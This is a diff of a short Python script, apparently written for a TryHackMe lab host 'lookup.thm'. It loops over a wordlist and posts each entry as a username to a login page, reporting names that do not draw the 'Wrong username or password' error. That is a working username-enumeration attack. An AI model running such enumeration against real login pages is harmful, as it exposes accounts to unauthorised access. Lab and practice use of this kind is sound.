@@ -1,6 +1,7 @@
 import requests
 import argparse
-
+import sys
+import time
 
 parser = argparse.ArgumentParser(
                     prog='teste',
@@ -10,19 +11,17 @@ parser = argparse.ArgumentParser(
 parser.add_argument('-w', '--wordlists')
 args = parser.parse_args()
 wordlist = open(args.wordlists, 'r')
+print("testando")
 
 for linha in wordlist:
-	new = linha[:-1]
-	payload = {
-		'username': f'{new}',
-		'password': "1"
-	}
-	r = requests.post('http://lookup.thm/login.php', data = payload)
-	conteudo = str(r.content, encoding='utf-8')
-	if "Wrong username or password" in conteudo:
-		pass	
-	else:
-		print("USername exist= ", linha)
-
-
-
+        new = linha[:-1]
+        payload = {
+                'username': f'{new}',
+                'password': "1"
+        }
+        r = requests.post('http://lookup.thm/login.php', data = payload)
+        conteudo = str(r.content, encoding='utf-8')
+        if "Wrong username or password" in conteudo:
+                print(f"Username errado= {new}" , end='\r')
+        else:
+                print(f"Username exist= {new} - ")
